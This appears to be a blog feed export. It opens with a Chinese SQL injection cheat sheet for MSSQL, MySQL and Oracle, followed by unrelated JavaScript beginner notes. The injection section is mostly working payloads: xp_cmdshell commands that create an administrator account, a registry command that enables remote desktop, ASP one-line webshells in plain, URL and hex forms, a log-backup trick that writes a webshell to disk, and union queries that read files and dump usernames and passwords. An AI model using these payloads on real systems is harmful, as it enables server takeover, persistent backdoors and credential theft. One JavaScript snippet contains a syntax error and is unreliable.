<h2 id="mssql注入高级操作"><a href="#mssql注入高级操作" class="headerlink" title="mssql注入高级操作"></a>mssql注入高级操作</h2><h3 id="建立数据库用户"><a href="#建立数据库用户" class="headerlink" title="建立数据库用户"></a>建立数据库用户</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">;exec master..sp_addlogin user,pass;--</div></pre></td></tr></table></figure>
<h3 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">;exec master..sp_addsrvrolemember user,sysadmin;--</div></pre></td></tr></table></figure>
<h3 id="打开3389"><a href="#打开3389" class="headerlink" title="打开3389"></a>打开3389</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">reg add &quot;hklm\System\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t reg_dword /d &quot;0&quot; /f</div></pre></td></tr></table></figure>
<h3 id="建立系统用户"><a href="#建立系统用户" class="headerlink" title="建立系统用户"></a>建立系统用户</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">;exec master..xp_cmdshell &quot;net user username password /add&quot;--</div><div class="line">;exec master..xp_cmdshell &quot;net localgroup administrators username /add&quot;--</div></pre></td></tr></table></figure>
<h3 id="读系统写文件"><a href="#读系统写文件" class="headerlink" title="读系统写文件"></a>读系统写文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">1.利用查询分析器连接数据库</div><div class="line">2.create table vvboot (line varchar(8000))  创建表</div><div class="line">3.bulk insert vvboot from &apos;c:\boot.ini&apos;     导入c:\boot.ini内容进tables</div><div class="line">4.select * from vvboot 			    读取tables内容</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">;exec master..xp_cmdshell &apos;echo aaa&gt;&gt;c:u.txt&apos;--  写入aa到c:u.txt &gt;&gt;追加</div></pre></td></tr></table></figure>
<h3 id="备份拿一句话木马"><a href="#备份拿一句话木马" class="headerlink" title="备份拿一句话木马"></a>备份拿一句话木马</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;%execute request(&quot;value&quot;)%&gt;</div><div class="line">&lt;%eval request(&quot;1&quot;)%&gt;</div><div class="line">URL编码：%3C%25execute+request%28%22value%22%29%25%3E </div><div class="line">十六进制：0x3C25657865637574652072657175657374282276616C75652229253E</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">；alter database article set RECOVERY FULL--   把恢复改为完全模式</div><div class="line">；create table　　alog (a image)--       建立一个表</div><div class="line">；backup alog article to disk=&apos;c:\cmd&apos; with init--     减少备份大小</div><div class="line">;insert into alog (a) values(&apos;&lt;%execute request(&quot;value&quot;)%&gt;&apos;)--     插入一句话木马</div><div class="line">;backup log article to disk=&apos;C:\darticle3.4\darticle3.4\a.asp&apos;--      备份日志</div></pre></td></tr></table></figure>
<h3 id="注入防范"><a href="#注入防范" class="headerlink" title="注入防范"></a>注入防范</h3><p>安全编码，参数化查询<br>WAF<br>防注入的脚本:<br>过滤关键字:and select update or union post get cookie<br>在有漏洞脚本调用防注入的脚本：</p>
<pre><code>&lt;!--#Include File=&quot;防注入脚本.asp&quot;--&gt;
</code></pre><h2 id="手工注入MySQL"><a href="#手工注入MySQL" class="headerlink" title="手工注入MySQL"></a>手工注入MySQL</h2><h3 id="数据库的管理工具"><a href="#数据库的管理工具" class="headerlink" title="数据库的管理工具"></a>数据库的管理工具</h3><pre><code>phpmyadmin
    默认user:root
    默认pass:php168.com
</code></pre><h3 id="php-ini"><a href="#php-ini" class="headerlink" title="php.ini"></a>php.ini</h3><pre><code>magic_quotes_gpc=on
</code></pre><p>对于GET/POST/Cookie提交的数据中的单引号、双引号、反斜线和空字节进行转义<br>也就是在这个字符前面加上反斜线，提交的“’”会变成“\”</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&apos;=%2527  绕过限制</div><div class="line">char(90) </div><div class="line">left(boardname,2)=char(97,104)</div></pre></td></tr></table></figure>
<h3 id="uion联合查询"><a href="#uion联合查询" class="headerlink" title="uion联合查询"></a>uion联合查询</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select table1,table2 from db1</div></pre></td></tr></table></figure>
<p>条件：</p>
<ul>
<li>前后表的列数要相同<pre><code>判断前表查询列数
union select 1 返回正常 表明前表为一列
union select 1,2,3,4,5 返回正常 表明前表为五列
union select null,null,null,null,null 
</code></pre> oracle:<pre><code>union select null,null,null,null,null from dual (oracle默认表名)
</code></pre></li>
<li>前后表对应列的数据类型要兼容<pre><code>判断前表哪列是字符
union select &apos;1&apos;,2,3,4,5   返回正常 说明第一列为字符
</code></pre></li>
<li>如果前表出错，将返回后表的结果<pre><code>id=-1 union select user()
id=-1 union select database()
</code></pre></li>
</ul>
<p>###　判断注入点</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">and 1=1 返回正常</div><div class="line">and 1=2 返回错误</div></pre></td></tr></table></figure>
<h3 id="判断用户名"><a href="#判断用户名" class="headerlink" title="判断用户名"></a>判断用户名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">id=-1 union select user()   联合查询</div><div class="line">union select current_user() 当前用户</div><div class="line">union select system_user() 系统用户</div><div class="line">id=-1 union select session_user()  连接数据库的用户</div></pre></td></tr></table></figure>
<h3 id="判断版本号"><a href="#判断版本号" class="headerlink" title="判断版本号"></a>判断版本号</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">id=-1 union select version()</div></pre></td></tr></table></figure>
<h3 id="判断当前连接数据库"><a href="#判断当前连接数据库" class="headerlink" title="判断当前连接数据库"></a>判断当前连接数据库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">id=-1 union select database()</div></pre></td></tr></table></figure>
<h3 id="判断表名-2"><a href="#判断表名-2" class="headerlink" title="判断表名"></a>判断表名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">id=-1 union select table from ddbname</div></pre></td></tr></table></figure>
<h3 id="判断值-2"><a href="#判断值-2" class="headerlink" title="判断值"></a>判断值</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">id=-1 union select username from dbname</div></pre></td></tr></table></figure>
<h3 id="读文件-load-file"><a href="#读文件-load-file" class="headerlink" title="读文件(load_file())"></a>读文件(load_file())</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">id=-1 union select load_file(&apos;c:\boot.ini&apos;)</div><div class="line">将文件名 c:\boot.ini 转换为十六进制 绕过“\”转义</div></pre></td></tr></table></figure>
<h2 id="手工注入Oracle"><a href="#手工注入Oracle" class="headerlink" title="手工注入Oracle"></a>手工注入Oracle</h2><h3 id="猜字段数"><a href="#猜字段数" class="headerlink" title="猜字段数"></a>猜字段数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">id=-1union select null , null from dual</div><div class="line">id=-1union select null, null , null from dual</div><div class="line">id=-1 union select null,null,null,null,null,null,null,null,null,null,null,null,null from dual</div></pre></td></tr></table></figure>
<h3 id="猜哪个字段为字符串"><a href="#猜哪个字段为字符串" class="headerlink" title="猜哪个字段为字符串"></a>猜哪个字段为字符串</h3><p>猜哪个字段是字符串型<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">id=-1 union select &apos;1&apos;,null,null,null,null,null,null,null,null,null,null,null,null from dual   第九个</div></pre></td></tr></table></figure></p>
<h3 id="猜用户"><a href="#猜用户" class="headerlink" title="猜用户"></a>猜用户</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">id=-1 union select null,null,null,null,null,null,null,null,user,null,null,null,null from user_tables  </div><div class="line"> 将用户代入字符串字段</div></pre></td></tr></table></figure>
<h3 id="查看版本信息"><a href="#查看版本信息" class="headerlink" title="查看版本信息"></a>查看版本信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">id=-1 union select null,null,null,null,null,null,null,null,banner,null,null,null,null from v$version  </div><div class="line"> 将banner代入字符串字段</div></pre></td></tr></table></figure>
<h3 id="看库名"><a href="#看库名" class="headerlink" title="看库名"></a>看库名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">id=-1 union select null,null,null,null,null,null,null,null,name,null,null,null,null from v$database    </div><div class="line"> 将库名代入字符串字段</div></pre></td></tr></table></figure>
<h3 id="看表数"><a href="#看表数" class="headerlink" title="看表数"></a>看表数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">id=-1 union select null,null,null,null,null,null,null,null,count(*)||&apos;&apos;,null,null,null,null from user_tables  </div><div class="line"> 将count(*)||&apos;&apos; 函数 代入字符串字段</div></pre></td></tr></table></figure>
<h3 id="看第一个表名"><a href="#看第一个表名" class="headerlink" title="看第一个表名"></a>看第一个表名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">id=-1 union select null,null,null,null,null,null,null,null,table_name,null,null,null,null from (select rownum aa,table_name from user_tables) where aa=1</div></pre></td></tr></table></figure>
<h3 id="查看表的记录数"><a href="#查看表的记录数" class="headerlink" title="查看表的记录数"></a>查看表的记录数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">id=-1 union select null,null,null,null,null,null,null,null,count(*)||&apos;&apos;,null,null,null,null from USERINFO</div></pre></td></tr></table></figure>
<h3 id="查看第一条记录"><a href="#查看第一条记录" class="headerlink" title="查看第一条记录"></a>查看第一条记录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">id=-1 union select null,null,null,null,null,null,null,null,USER_ACCOUNT,null,null,null,null from(select rownum aa,USER_ACCOUNT from USERINFO)where aa=1</div></pre></td></tr></table></figure>
<h3 id="查看密码"><a href="#查看密码" class="headerlink" title="查看密码"></a>查看密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">id=-1 union select null,null,null,null,null,null,null,null,PASSWORD,null,null,null,null from(select rownum aa,PASSWORD from USERINFO)where aa=1</div></pre></td></tr></table></figure>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[智能社：JavaScript教程-从入门到精通视频-整理笔记]]></title>
      <url>http://uknowsec.cn/posts/notes/%E6%99%BA%E8%83%BD%E7%A4%BE%EF%BC%9AJavaScript%E6%95%99%E7%A8%8B-%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A%E8%A7%86%E9%A2%91%E6%95%B4%E7%90%86%E7%AC%94%E8%AE%B0.html</url>
      <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/vaBq86vyU_oNsNHGme3T1HWSdJ6vvn6X5xAgtgVzRWvEAQAA_wAAAEpQ.jpg" alt="javascript"></p>
<h1 id="初探JavaScript魅力-1"><a href="#初探JavaScript魅力-1" class="headerlink" title="初探JavaScript魅力-1"></a>初探JavaScript魅力-1</h1><h2 id="JavaScript是什么"><a href="#JavaScript是什么" class="headerlink" title="JavaScript是什么"></a>JavaScript是什么</h2><p>根据用户的一些操作，然后来修改页面上的一些元素、属性等。</p>
<p>（1）HTML+CSS静态页面，JS给页面添加动的效果</p>
<p>（2）网页特效的原理</p>
<p>javascript就是修改样式</p>
<p>（3）编写JS的流程：</p>
<p>【1】布局：HTML+CSS</p>
<p>【2】属性：确定要修改哪些属性</p>
<p>【3】事件：确定用户做哪些操作</p>
<p>【4】编写JS：在事件中，用JS来修改页面元素的样式</p>
<p>补：事件：就是用户操作，如鼠标点击、移入、移出等</p>
<p>（4）id：在css中，id作为css里的一个选择符存在，而在JS里它有更加广泛的用途，</p>
<p>   在JS中扮演标签(元素)名字的作用，如<div id="div1">……</div>，id在这个例子里扮演了div名字的作用，div1就是div的名字</p>
<p>（5）div1.style.display=’block’</p>
<p>点 .      ——&gt; 的，一般来说是所属的关系，其实是属性</p>
<p>等号 = ——&gt; 在数学里，x=5，表示x的值就是5，即等号就是相等的意思</p>
<p> 在JS里，等号并不是相等的意思，等号指赋值，把什么变成什么，把=右边的值赋给左边</p>
<h2 id="第一个JS兼容性问题-document-getElementById"><a href="#第一个JS兼容性问题-document-getElementById" class="headerlink" title="第一个JS兼容性问题:document.getElementById"></a>第一个JS兼容性问题:document.getElementById</h2><p>（1）在FF和低版本的chrome下，是不能直接拿着id就用的，存在兼容问题</p>
<p>真正兼容的写法是document.getElementById(‘id名字’)，在任何浏览器下均可用</p>
<p>如：document.getElementById(‘div1’);</p>
<p>   通过div1这个id把元素获取出来，然后再来用</p>
<p>注：记住，不能直接拿着id就用，而必须的通过getElementById（把元素获取出来）获取一下，然后才可以用 </p>
<p>（2）网页换肤</p>
<p>(1) 任何标签都可以加ID，包括link</p>
<p>(2) 任何标签的任何属性，也都可以修改</p>
<p>(3) HTML里怎么写，JS里就怎么写，只有一个例外就是class，因为class在JS里是关键字（保留字），所以不能直接拿来用，要写成className</p>
<h2 id="引入函数：因为直接在事件内写代码会很乱"><a href="#引入函数：因为直接在事件内写代码会很乱" class="headerlink" title="引入函数：因为直接在事件内写代码会很乱"></a>引入函数：因为直接在事件内写代码会很乱</h2><p>（1）函数基本格式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">[javascript] view plain copy</div><div class="line"></div><div class="line">    function 函数名()  </div><div class="line">    &#123;  </div><div class="line">            代码  </div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
<p> JS里的函数和css里的class有点相似，像class它最大的一个功能就是你把这个样式写到class里边，然后只要需要这套样式的地方，直接把那个class拿过去用就</p>
<p> 可以了，同样JS里的函数也一样.</p>
<p>（2）函数的定义和调用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">[javascript] view plain copy</div><div class="line"></div><div class="line">    function show()        //定义  </div><div class="line">    &#123;  </div><div class="line">        alert(&apos;abc&apos;);  </div><div class="line">    &#125;  </div><div class="line">    show();               //调用</div></pre></td></tr></table></figure>
<p>函数定义：只是告诉系统有这个函数，不会实际执行</p>
<p>函数调用：真正执行函数里的代码</p>
<p>注：函数的定义和调用缺一不可，只有定义则没反应，只有调用则显示出错了</p>
<p>（3）引入变量的概念：考虑到重用</p>
<p>变量：就是给东西取了个别名</p>
<p>如var oDiv=document.getElementById(‘div1’);给后面这大串取了个别名叫oDiv。看到oDiv就跟看到document.getElementById(‘div1’)是一样的效果</p>
<p>注：(1) 如果你要操作一个元素，你必须先把它选择过来，比如现在要操作的是text这个元素，那么需要先给它加个id，比如id=”txt1”,然后function函数里用</p>
<p> getElementById把它给选择过来</p>
<p>(2) 要操作谁，就要获取谁  </p>
<p>(3) 需要一个函数，这个函数是为按钮准备的，因为它点击需要一个函数</p>
<h2 id="if判断：如点击按钮显示-隐藏div-弹出菜单"><a href="#if判断：如点击按钮显示-隐藏div-弹出菜单" class="headerlink" title="if判断：如点击按钮显示/隐藏div(弹出菜单)"></a>if判断：如点击按钮显示/隐藏div(弹出菜单)</h2><p>（1）if判断基本格式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">[javascript] view plain copy</div><div class="line"></div><div class="line">    if(条件)  </div><div class="line">    &#123;  </div><div class="line">    语句1  </div><div class="line">    &#125;  </div><div class="line">    else  </div><div class="line">    &#123;  </div><div class="line">    语句2  </div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
<p>翻译：如果条件成立就执行语句1，如果条件不成立就执行语句2</p>
<p>  注：<br> (1) if ：如果<br> (2) 条件：在IS里是判断的意思，就是遇到不同的情况就做不同的操作，遇到不同的问题就做不同的处理</p>
<p>（2）单等和双等(=和==)</p>
<p>=    赋值（改变，变成）</p>
<p>==   判断（判断两边是否相等）</p>
<p>（3）为a链接添加JS<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">&lt;!--&lt;a href=&quot;javascript:alert(&apos;a&apos;);&quot;&gt;链接&lt;/a&gt; --&gt;     </div><div class="line"></div><div class="line">&lt;a href=&quot;javascript:;&quot;&gt;链接&lt;/a&gt;</div></pre></td></tr></table></figure></p>
<p>一般a里不加JS代码，而是空的js原因：(1) 在a里加js代码不好 (2) 加空的js代码而不是加##，因为它不会像##那样一点就跳到页首。</p>
<h1 id="初探JavaScript魅力-2"><a href="#初探JavaScript魅力-2" class="headerlink" title="初探JavaScript魅力-2"></a>初探JavaScript魅力-2</h1><h2 id="函数传参"><a href="#函数传参" class="headerlink" title="函数传参"></a>函数传参</h2><h3 id="改变背景颜色"><a href="#改变背景颜色" class="headerlink" title="改变背景颜色"></a>改变背景颜色</h3><p>(1)参数传参：参数就是占位符（占住一个位置，以便于后续向里面塞东西）<br>    什么时候用传参–函数里定不下来的东西<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">function setColor(color)</div><div class="line">&#123;</div><div class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</div><div class="line">	</div><div class="line">	oDiv.style.background=color;</div><div class="line">&#125;</div><div class="line">&lt;input type=&quot;button&quot; value=&quot;变黑&quot; onclick=&quot;setColor(&apos;black&apos;);&quot; /&gt;</div><div class="line">&lt;div id=&quot;div1&quot;&gt;</div></pre></td></tr></table></figure></p>
<p>上例定义函数setColor，它有一个参数为color,从input中传递一个参数为black，才是color这个参数就为black,从而实现函数参数的传递。</p>
<h3 id="改变Div的任意样式"><a href="#改变Div的任意样式" class="headerlink" title="改变Div的任意样式"></a>改变Div的任意样式</h3><p>(1)操纵属性的两种方式<br>   将属性名作为参数传递</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"> 1.</div><div class="line"> </div><div class="line"> function setStyle(name, value)</div><div class="line">&#123;</div><div class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</div><div class="line">	//第一种操作属性的方法  特点:[]里面为一个字符串，可以用变量代替</div><div class="line">	oDiv.style[&apos;name&apos;]=value;</div><div class="line">	//第二种操作属性的方法  特点：方便</div><div class="line">	oDiv.style.name.=value;</div><div class="line">&#125;</div><div class="line">&lt;input type=&quot;button&quot; value=&quot;变绿&quot; onclick=&quot;setStyle(&apos;background&apos;, &apos;green&apos;)&quot; /&gt;</div><div class="line">&lt;div id=&quot;div1&quot;&gt;</div></pre></td></tr></table></figure>
<h3 id="style与className"><a href="#style与className" class="headerlink" title="style与className"></a>style与className</h3><p> (1)元素.style.属性=xxx是修改行间样式</p>
<p>样式优先级：*&lt;标签&lt;class&lt;ID&lt;行间</p>
<p>如下代码 已给出style的属性再修改className就不会有效果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE HTML&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</div><div class="line">&lt;title&gt;无标题文档&lt;/title&gt;</div><div class="line">&lt;style&gt;</div><div class="line">##div1 &#123;width:200px; height:200px; border:1px solid black;&#125;</div><div class="line">.box &#123;background:red;&#125;</div><div class="line">&lt;/style&gt;</div><div class="line">&lt;script&gt;</div><div class="line">function toRed()</div><div class="line">&#123;</div><div class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</div><div class="line">	</div><div class="line">	oDiv.className=&apos;box&apos;;</div><div class="line">&#125;</div><div class="line">function toGreen()</div><div class="line">&#123;</div><div class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</div><div class="line">	</div><div class="line">	oDiv.style.background=&apos;green&apos;;</div><div class="line">&#125;</div><div class="line">&lt;/script&gt;</div><div class="line">&lt;/head&gt;</div><div class="line"></div><div class="line">&lt;body&gt;</div><div class="line">&lt;input type=&quot;button&quot; value=&quot;变红&quot; onclick=&quot;toRed()&quot; /&gt;</div><div class="line">&lt;input type=&quot;button&quot; value=&quot;变绿&quot; onclick=&quot;toGreen()&quot; /&gt;</div><div class="line">&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<p>注意：<br>1.若已给出style的属性再修改className就不会有效果<br>2.对于同一个元素，要么选择操纵class要么操纵style</p>
<h2 id="提取行间事件"><a href="#提取行间事件" class="headerlink" title="提取行间事件"></a>提取行间事件</h2><h3 id="为元素添加事件"><a href="#为元素添加事件" class="headerlink" title="为元素添加事件"></a>为元素添加事件</h3><p>(1)事件和其他属性一样，可以用JS添加<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">function 名字()</div><div class="line">&#123;</div><div class="line">	...</div><div class="line">&#125;</div><div class="line">oBtn.onclick=名字   //直接获取onclick属性</div><div class="line"></div><div class="line"></div><div class="line">oBtn.onclick=function ()    //匿名函数</div><div class="line">&#123;</div><div class="line">	....</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<h3 id="window-onload的意义"><a href="#window-onload的意义" class="headerlink" title="window.onload的意义"></a>window.onload的意义</h3><p> 1.script标签一般不放body里<br> 2.使用window.online加载HTML的代码</p>
<p>(3)行为（JS）、样式(CSS)、结构(HTML)三者分离</p>
<p> （2）获取一组元素<br>（1）getElementsByTagName<br>   优势：<br>   1.获取一组元素（数组）<br>   2.配合循环使用<br>   3..length获取数组长度</p>
<h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h2><h3 id="while循环、for循环"><a href="#while循环、for循环" class="headerlink" title="while循环、for循环"></a>while循环、for循环</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">while(条件)</div><div class="line">&#123;</div><div class="line">	语句</div><div class="line">&#125;</div><div class="line">   </div><div class="line">   </div><div class="line">   for循环</div><div class="line"></div><div class="line">for(初始化;条件;自增)</div><div class="line">&#123;</div><div class="line">	语句</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>（2）用for循环为一组元素添加事件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">for(var i=0;i&lt;aDiv.length;i++)</div><div class="line">&#123;</div><div class="line">	//i-&gt;0,1,2,3</div><div class="line">	aDiv[i].style.background=&apos;red&apos;;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p> （3）实现全选、反选、不选</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">	oBtn1.onclick=function ()     //全选</div><div class="line">&#123;</div><div class="line">	for(var i=0;i&lt;aCh.length;i++)</div><div class="line">	&#123;</div><div class="line">		aCh[i].checked=true;</div><div class="line">	&#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">oBtn2.onclick=function ()      //不选</div><div class="line">&#123;</div><div class="line">	for(var i=0;i&lt;aCh.length;i++)</div><div class="line">	&#123;</div><div class="line">		aCh[i].checked=false;</div><div class="line">	&#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">oBtn3.onclick=function ()        //反选</div><div class="line">&#123;</div><div class="line">	for(var i=0;i&lt;aCh.length;i++)</div><div class="line">	&#123;</div><div class="line">		if(aCh[i].checked==true)</div><div class="line">		&#123;</div><div class="line">			aCh[i].checked=false;</div><div class="line">		&#125;</div><div class="line">		else</div><div class="line">		&#123;</div><div class="line">			aCh[i].checked=true;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h2 id="选项卡"><a href="#选项卡" class="headerlink" title="选项卡"></a>选项卡</h2><h3 id="按钮的实现"><a href="#按钮的实现" class="headerlink" title="按钮的实现"></a>按钮的实现</h3><p>(1)添加事件<br>    this的使用<br>    用this选定当前元素，用来修改当前元素的属性</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">	for(var i=0;i&lt;aBtn.length;i++)</div><div class="line">	&#123;</div><div class="line">		aBtn[i].onclick=function ()</div><div class="line">		&#123;</div><div class="line">			this.className=&apos;active&apos;;</div><div class="line">		&#125;;</div><div class="line">	&#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">```	</div><div class="line"></div><div class="line">	</div><div class="line">(2)先清空所有按钮，再选中当前按钮</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">```	for(var i=0;i&lt;aBtn.length;i++)</div><div class="line">	&#123;</div><div class="line">		aBtn[i].onclick=function ()</div><div class="line">		&#123;</div><div class="line">			for(var i=0;i&lt;aBtn.length;i++)</div><div class="line">			&#123;</div><div class="line">				aBtn[i].className=&apos;&apos;;</div><div class="line">			&#125;</div><div class="line">			this.className=&apos;active&apos;;</div><div class="line">		&#125;;</div><div class="line">	&#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h3 id="内容的实现"><a href="#内容的实现" class="headerlink" title="内容的实现"></a>内容的实现</h3><p>(1)索引值的使用<br>(2)什么时候用索引值——需要知道“第几个”的时候<br>(3)html添加index——会被浏览器过滤<br>(3)js添加index</p>
